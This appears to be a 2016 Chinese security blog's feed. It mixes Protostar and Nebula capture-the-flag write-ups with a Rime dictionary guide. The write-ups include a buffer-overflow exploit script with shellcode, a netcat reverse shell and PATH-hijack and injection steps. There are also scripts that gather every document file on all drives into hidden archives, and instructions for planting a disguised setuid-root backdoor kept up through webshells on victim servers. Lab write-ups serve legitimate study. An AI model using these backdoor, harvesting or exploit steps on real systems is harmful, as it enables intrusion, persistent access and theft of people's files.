尝试通过shellcode前面加上标志&quot;bbbb&quot;找出shellcode在内存中的固定地址，其中上面jmp_esp的值为随意填写的一个

python exploit.py
--------------output:-----------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�H��bbbbH1����H���H�Sݧ����H1X&#39;H-����9ȋR���W����&#39;������
                              V�ͮ���Mŷ�ĭ�
                                        ��?�M   o����(MĂ��]o�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
----------------end-------------------

gdb -q -c core
---------------output:------------------
[New LWP 24384]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xa08748ff in ?? ()
-----------------end--------------------

x/10x $esp
----------output:-----------
0xffd26180:     0x62626262      0x48c93148      0xfff6e981      0x8d48ffff
0xffd26190:     0xffffef05      0x53bb48ff      0xa29ca7dd      0x4805be89
0xffd261a0:     0x2d485831      0xfffffff8
-----------end--------------
由此看出shellcode在内存的地址应该写成0xffd26180,也即jmp_esp=&quot;\x80\x61\xd2\xff&quot;,并将&quot;bbbb&quot;换成&quot;\x90&quot;*9,修改exploit.py如下：
--------------------exploit.py-------------------
#/usr/bin/python
import os
import sys

buf =  &quot;\x90&quot;*9
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;

jmp_esp=&quot;\x80\x61\xd2\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
----------------------end------------------------

重新运行：
python exploit.py
----------------output:-------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�a���������H1����H���H�Sݧ����H1X&#39;H-����9ȋR���W����&#39;������
                                 V�ͮ���Mŷ�ĭ�
                                           ��?�M        o����(MĂ��]o�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
------------------end---------------------

本机用相同的payload+multi/handler执行exploit无法获得shell
分析core
gdb -q -c core
-----------------output:--------------------
[New LWP 24746]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffd26180 in ?? ()
-------------------end----------------------

x/10x $esp
----------output:-------------
0xffa14160:     0x90909090      0x90909090      0xc9314890      0xf6e98148
0xffa14170:     0x48ffffff      0xffef058d      0xbb48ffff      0x9ca7dd53
0xffa14180:     0x05be89a2      0x48583148
-------------end--------------

从中发现这时shellcode的内存地址又变成了0xffa14160(上面[esp]后紧接的9个90证明了这点),不再是0xffd26180,可以看出kali的内存中没有固定的shellcode地址,每次shellcode地址都会变化，这应该是由于kali的内核版本高，安全性好造成的

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 04 Jun 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/</guid>
        
        <category>stack</category>
        
        <category>linux</category>
        
        <category>disassemble</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>protostar系统学习</title>
        <description>&lt;h4 id=&quot;xff-about-protostar&quot;&gt;0xff About Protostar&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Protostar introduces the following in a friendly way:

Network programming
Byte order
Handling sockets
Stack overflows
Format strings
Heap overflows
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.&lt;/p&gt;

&lt;p&gt;In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;official website:       https://exploit-exercises.com/protostar
nebula.iso download:    http://pan.baidu.com/s/1nvq3f5J
some witeup:    
    https://lightless.me/archives/protostar-stack-writeup.html
    http://bug.cool/2016/Protostar_Writeup/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x00-stack0&quot;&gt;0x00 stack0&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    cd /opt/protostar/bin
    objdump -d -M intel stack0 &amp;gt; /tmp/stack0.out
    vi stack0.out
link knowledge:
    http://blog.163.com/lixiangqiu_9202/blog/static/535750372012727102618226/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 03 Jun 2016 00:00:00 +0800</pubDate>
        <link>/linux/2016/06/03/protostar/</link>
        <guid isPermaLink="true">/linux/2016/06/03/protostar/</guid>
        
        <category>overflow</category>
        
        <category>linux</category>
        
        
        <category>linux</category>
        
      </item>
    
      <item>
        <title>rime五笔词库合并</title>
        <description>&lt;h4 id=&quot;x01-step1on-kali-linux&quot;&gt;0x01 Step1:on kali linux&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/rime_dic_manager -l
output:wubi86
cd /root/桌面/
/usr/bin/rime_dic_manager -e wubi86 kali.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-step2on-win7&quot;&gt;0x02 Step2:on win7&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd %appdata%\rime
copy wubi86.userdb.kct \\kali\桌面\
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x03-step3on-kali-linux&quot;&gt;0x03 Step3:on kali linux&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root/.config/fcitx/rime
mv /root/.config/fcitx/rime/wubi86.userdb.kct wubi86.userdb.kct.bak
cp /root/桌面/wubi86.userdb.kct .
重新布置rime
/usr/bin/rime_dic_manager -l
cd /root/桌面
/usr/bin/rime_dic_manager -e wubi86 win7.txt

-------------------two ways since now---------------
first:
/usr/bin/rime_dic_manager -i wubi86 kali.txt
重新布置rime

second:
vi -d kali.txt win7.txt
vi kali.txt
    G
    o
    esc
    :r win7.txt
    :x
python 字典去重.py kali.txt         (output:outfile.txt)
    this .py script:https://raw.githubusercontent.com/xinghuacai/password_tools/master/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7/%E5%AD%97%E5%85%B8%E6%95%B4%E7%90%86%E5%8E%BB%E9%87%8D%E5%B7%A5%E5%85%B7.py

/usr/bin/rime_dict_manager -r outfile.txt
or
/usr/bin/rime_dict_manager -i wubi86 outfile.txt

重新布置rime
---------------------end----------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;update&quot;&gt;update&lt;/h3&gt;

&lt;h4 id=&quot;section&quot;&gt;16-05-25&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;win7:
程序-&amp;gt;用户词库管理-&amp;gt;导出词典快照（rime-&amp;gt;rime）
                  -&amp;gt;导出文本码表(dic-&amp;gt;newdic)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;the difference between 词典快照 and 文本码表&lt;/p&gt;

&lt;p&gt;1.词典快照
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/%E8%AF%8D%E5%85%B8%E5%BF%AB%E7%85%A7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2.文本码表
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/%E6%96%87%E6%9C%AC%E7%A0%81%E8%A1%A8.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;section-1&quot;&gt;16-05-28&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python script:(performs well on kali,but not on win7)

download:
https://raw.githubusercontent.com/xinghuacai/little_scripts/master/rimedic_handle.py

---------rimedic_handle.py------------
import sys
fp=open(sys.argv[1])
all=fp.readlines()
fp.close()
#print len(all)
newall2in3=[]
fp=open(&quot;newdic.txt&quot;,&quot;a+&quot;)
for eachline in all:
    if &quot;#&quot; not in eachline:
        eachline2in3=eachline.split(&#39;\t&#39;)[:2]
        if eachline2in3 not in newall2in3 and &#39;enc&#39; not in eachline and &#39; &#39; not in eachline2in3[0] and (eachline2in3[0][0]&amp;lt;&#39;a&#39; or eachline2in3[0][0]&amp;gt;&#39;z&#39;):
            newall2in3.append(eachline2in3)
            fp.write(eachline)

#print len(newall)
fp.close()
--------------------------------------
get pure txt dic
    different from real rime dic,this pure txt dic does not exist the rime dic header like
        # rime-...
        # user-id...
    but this pure txt dic has the same \t split symbol as real rime dic

dic from win7:
    导出文本码表
    cp out.txt \\kali\root\out.txt
    cd \\kali\root
    python rimedic_handle.py out.txt
    output:newdic.txt

dic from kali:
    cd /root/.config/fcxti/rime
    pkill fcitx
    /usr/bin/rime_dict_manager -e wubi86 /root/kali.txt
    cd /root
    python rimedic_handle.py kali.txt
    output:newdic.txt
    restart fcitx:
        http://www.findspace.name/res/786
        -----------content------------
        pidof fcitx | xargs kill
        pidof sogou-qimpanel | xargs kill
        nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        -----------end----------------
        
        or:
        --------content---------
        pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;;nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
        ---------end------------

make myown larger dic
    
    download 8万精准超小词库.txt from 
        https://github.com/studyzy/imewlconverter/tree/master/IME%20WL%20Converter/%E5%8F%82%E8%80%83
    download scel from sougou wubi website
        http://wubi.sogou.com/dict/
    use imewlconverter.exe(深蓝词库转换工具) to convert from upon dics.txt to 8w_sougou_rime_wubi86_dic.txt
    *attention*:
        do not forget to change frequency from 10 to 1 when turning sougou scel to rime dic,the number of frequency words from sougou scel may not be 1,but bigger like 10.
    
    cd \\kali\root
    vi 8w_sougou_rime_wubi86_dic.txt
    G
    :r newdic.txt
    XX
    rm newdic.txt
    python rimedic_handle.py 8w_sougou_rime_wubi86_dic.txt
    output:newdic.txt
    
    16-05-28 newdic.txt&#39;s download link:
        8w only:
            http://pan.baidu.com/s/1c2uiZks
        8w+scel_sougou_new_added_frequency_to_1:
            http://pan.baidu.com/s/1miMsYhU
    
    import:
        kali:
            cd /root/.config/fcitx/rime
            /usr/bin/rime_dic_manager -i wubi86 /root/newdic.txt
        win7:
            导入文本码表----&amp;gt;\\kali\root\newdic.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 24 May 2016 00:00:00 +0800</pubDate>
        <link>/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</link>
        <guid isPermaLink="true">/auxilary/2016/05/24/rime%E4%BA%94%E7%AC%94%E8%AF%8D%E5%BA%93%E5%90%88%E5%B9%B6/</guid>
        
        <category>type</category>
        
        <category>rime</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>文件一键打包</title>
        <description>&lt;h4 id=&quot;x01-linux&quot;&gt;0x01 linux&lt;/h4&gt;

&lt;p&gt;linux打包命令：
&lt;a href=&quot;http://pan.baidu.com/s/1nvcVqOT&quot;&gt;1.sh&lt;/a&gt; 密码：0y03&lt;br /&gt;
(attention:without “&amp;amp;&amp;amp; echo ok”,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------content of 1.sh--------------------
mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
--------------------end-----------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-windows&quot;&gt;0x02 windows&lt;/h4&gt;

&lt;p&gt;windows打包(rar|7z)命令：
&lt;a href=&quot;http://pan.baidu.com/s/1slMivlb&quot;&gt;1.bat&lt;/a&gt; 密码：3lwz&lt;br /&gt;
(attention:7z.exe for x32 need a 7z.dll to performs well while 7z.exe for x64 needn’t)
(rar.exe does not have the x86 or x64 isssue)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------content of 1.bat--------------------------
@echo off
goto :main
这是注释：(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 
rd /s/q c:\recycler\tmp
md c:\recycler\tmp
echo  当前硬盘的分区有： 
for %%i in (%str%) do (
if exist %%i: (echo %%i:

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.doc&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; tmp.txt
)

for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.docx&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.pdf&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.txt&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xls&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\*.xlsx&quot;&#39;) do (
echo &quot;yes&quot; | copy &quot;%%j&quot; c:\recycler\tmp
echo %%j &amp;gt;&amp;gt; c:\recycler\tmp\tmp.txt
)


)
)

c:\recycler\rar.exe a -k -r -s -m1 c:\recycler\tmp\tmp.rar c:\recycler\tmp\*.*
------------------end--------------------------------

or

c:\recycler\7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 20 May 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</link>
        <guid isPermaLink="true">/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/</guid>
        
        <category>windows</category>
        
        <category>dir /s</category>
        
        <category>sh</category>
        
        <category>7z</category>
        
        <category>tar</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>nebula系统学习</title>
        <description>&lt;h4 id=&quot;xff-about-nebula&quot;&gt;0xff About Nebula&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at

SUID files
Permissions
Race conditions
Shell meta-variables
$PATH weaknesses
Scripting language weaknesses
Binary compilation failures

At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.

official website:       https://exploit-exercises.com/nebula/
nebula.iso download:    http://pan.baidu.com/s/1dFdRIm9
some witeup:    
                        google--&amp;gt;cache:https://lightless.me/archives/Nebula-writeup.html
                        or
                        http://pan.baidu.com/s/1mhQgqCg
                        or
                        https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x00-level00&quot;&gt;0x00 level00&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level00
    pass:level00
    find / -type f -perm -4000 -ls &amp;gt; tmp.txt
link knowledge:
    linux中suid,sgid,sticky详解：http://crazyming.blog.51cto.com/1048571/467414
    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
    find / -perm -2 -type f -print             function:find files can be writeable by everyone
        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
        /tmp/.sh -p(this command to get a euid=root shell)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x01-level01&quot;&gt;0x01 level01&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level01
    password:level01
    PATH=/tmp:$PATH;export PATH;echo $PATH
    vi /tmp/echo
    -----content-----
    /bin/sh
    ------end--------
    chmod +x /tmp/echo
    cd /home/flag01
    ./flag01
    getflag

link knowledge:
    the source code of /home/flag01/flag01 is:

    ------------content of source.c------------
    #include &amp;lt;stdlib.h&amp;gt;
    #include &amp;lt;unistd.h&amp;gt;
    #include &amp;lt;string.h&amp;gt;
    #include &amp;lt;sys/types.h&amp;gt;
    #include &amp;lt;stdio.h&amp;gt;
    
    int main(int argc, char **argv, char **envp)
    {
      gid_t gid;
      uid_t uid;
      gid = getegid();
      uid = geteuid();
    
      setresgid(gid, gid, gid);
      setresuid(uid, uid, uid);
    
      system(&quot;/usr/bin/env echo and now what?&quot;);
    }
    ------------end----------------------------

    when I trid to execute some commands as upon &quot;mykey&quot; do,but without its &quot;chmod +x /tmp/echo&quot;,I found it can not return a shell with suid=flag01 to execute /home/flag01/flag01,later I added chmod +x /tmp/echo,it succeeded.
    ls -l /home/flag01 --&amp;gt;  -rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01

    this means file flag01&#39;s owner is user flag01,belongs to group level01,but has setuid attribute,so when other user like level01 will get file flag01&#39;s owner(that is user flag01)&#39;s privilege

    which getflag--&amp;gt;/bin/getflag
    ls -l /bin/getflag--&amp;gt;  -rwxr-xr-x 1 root root 7311 2011-11-23 14:51 /bin/getflag

    then execute upon &quot;mykey&quot; commands to pass level01,/bin/getflag is a program checks whether the user who execute /bin/getflag belongs to &quot;flag account&quot;,when a &quot;non-flag account&quot; like level01 trys to execute /bin/getflag,it returns:&quot;getflag is executing on a non-flag account,this doesn&#39;t count&quot;

    however,when I first didn&#39;t add &quot;chmod +x /tmp/echo&quot; in &quot;mykey&quot;,I thought may be there exists some error in level01,and tried to change the source code of /home/flag01/flag01 to file.c:

    #include &amp;lt;stdlib.h&amp;gt;
    #include &amp;lt;unistd.h&amp;gt;
    #include &amp;lt;string.h&amp;gt;
    #include &amp;lt;sys/types.h&amp;gt;
    #include &amp;lt;stdio.h&amp;gt;
    
    int main(int argc, char **argv, char **envp)
    {
    	gid_t gid;
    	uid_t uid;
    	gid = getegid();
    	uid = geteuid();
    
    	setresgid(gid, gid, gid);
    	setresuid(uid, uid, uid);
    
    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
    }
    ------------end------------------------

    that is change the final system sentence from &quot;system(&quot;/usr/bin/env echo and now what?&quot;);&quot; to &quot;system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);&quot;,and this could be a &quot;works well backdoor&quot; when get a root shell in a system:
    to use this file.c as a root shell backdoor after got a root shell,
    use root role execute:
        gcc -o 1 file.c
        mv 1 /bin/l2ping
        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
    use webshell role execute:
        PATH=/tmp:$PATH
        export PATH
        echo $PATH(to check if /tmp is in $PATH)
        ln -s /bin/sh /tmp/echo
        or:PATH=/tmp:$PATH;export PATH;echo $PATH;ln -s /bin/sh /tmp/echo
        (later I found this will not get root shell,coz a new terminal shell created[/tmp/echo--&amp;gt;/bin/sh] by upon way will not display in webshells&#39; terminal)
    then use webshell role to get a root privilege shell:
        /bin/l2ping
    
    both source.c and file.c can be a root privilege backdoor shell,the difference between source.c and file.c is:
    by source.c we should execute &quot;chmod +x /tmp/echo&quot;
    by file.c we should execute &quot;ln -s /bin/sh /tmp/echo&quot;

    *attention*:
    when I tried to keep root privilege in webshell,and conveniently execute commands in webshell but with root privilege(so I don&#39;t have to use reGeorg and proxycap and putty and upon two kinds of backdoor to connect target victim pc and execute commands with root shell,these actions are too slow to control target server),I tried to use root privilege to execute:
        chmod 4755 /..../..../webshell.php(eg.b374kshell)
        browser visit--&amp;gt;http://xxx/xxx/xxx/webshell.php ---&amp;gt;  terminal:
        id
        out:auid=48(apache) gid=48(apache) groups=48(apache)
    later I realized a webshell.php file with setuid=root will not execute as root privilege,coz only executable files like elf,*.sh files will execute as root privilege,*.php file is not in the scope,so my webshell&#39;s terminal will has apache&#39;s privilege,not root,I could chmod 4755 apache to get root privilege in webshell.php,but it&#39;s not wise.

    !!!cool thing:   
    one sentence to keep root shell in webshell(strong webshell better,like b374k,chopper may be stopped to execute a normal command when there exists some waf),use webshell&#39;s terminal function to execute:
        PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &quot;whoami&quot; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
    this means with role apache&#39;s privilege to execute a program(a file with setuid=root),but it will has root privilege to execute commands,change &quot;whoami&quot; to any commond is ok to execute as root privilege.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-level02&quot;&gt;0x02 level02&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level02
    pass:level02
    USER=&quot;nihao;sh&quot;
    ./flag02
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x03-level03&quot;&gt;0x03 level03&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    su - level03
    pass:level03(下文略去su - levelxx;pass:levelxx)
    cd /home/flag03
    vi writable.d/1.sh
    ---------content------
    (id;getflag) &amp;gt; /tmp/tmp.txt
    ----------end---------
    chmod +x writable/1.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x04-level04&quot;&gt;0x04 level04&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    cd /home/flag04
    ln -s /home/flag04/token /tmp/level04
    ./flag04 /tmp/level04
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x05-level05&quot;&gt;0x05 level05&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    cd /home/flag05
    ls -la
    cp ./backup/* /home/level05
    cd /home/level05
    tar zxvf backup[tab]
    ls -la(then found .ssh directory created in common directory&amp;lt;/home/level05&amp;gt;)
    ssh flag05@127.0.0.1
    yes
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x06-level06&quot;&gt;0x06 level06&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /etc/passwd
    v--&amp;gt; flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh --&amp;gt; :&amp;lt;,&amp;gt;w pass.txt
    use kali2&#39;s john
    john pass.txt
    get flag06:hello
    su - flag06
    pass:hello
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x07-level07&quot;&gt;0x07 level07&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    ctr+alt+f2 --&amp;gt; tty2
    tty2:nc -lnv 8888
    ctr+alt+f1(backto tty1)
    tty1:wget -O- &quot;http://127.0.0.1:7007/index.cgi?Host=127.0.0 || mknod /tmp/backpipe p &amp;amp;&amp;amp; /bin/sh 0&amp;lt;/tmp/backpipe | nc 127.0.0.1 8888 1&amp;gt;/tmp/backpipe&quot;
    ctr+alt+f2 --&amp;gt; tty2
    tty2:id(flag07),getflag
link knowledge:
    for security,the linux system may not support -e parameter in netcat(nc -e ip port),so one way to exploit is:
        mknod /tmp/backpipe p
        /bin/bash 0&amp;lt;/tmp/backpipe | nc 127.0.0.1 8888 1&amp;gt;/tmp/backpipe
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x08-level08&quot;&gt;0x08 level08&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    scp level08@192.168.2.140:/home/flag08/capture.pcap /root/Desktop/
    wireshark to open /root/Desktop/capture.pcap
    use wireshark,choose any tcp data,right click mouse,choose follow tcp stream
    find password:...
    use hex dump view to find 7f==&amp;gt;. is backspace
    su - flag08
    pass:backd00Rmate
    getflag
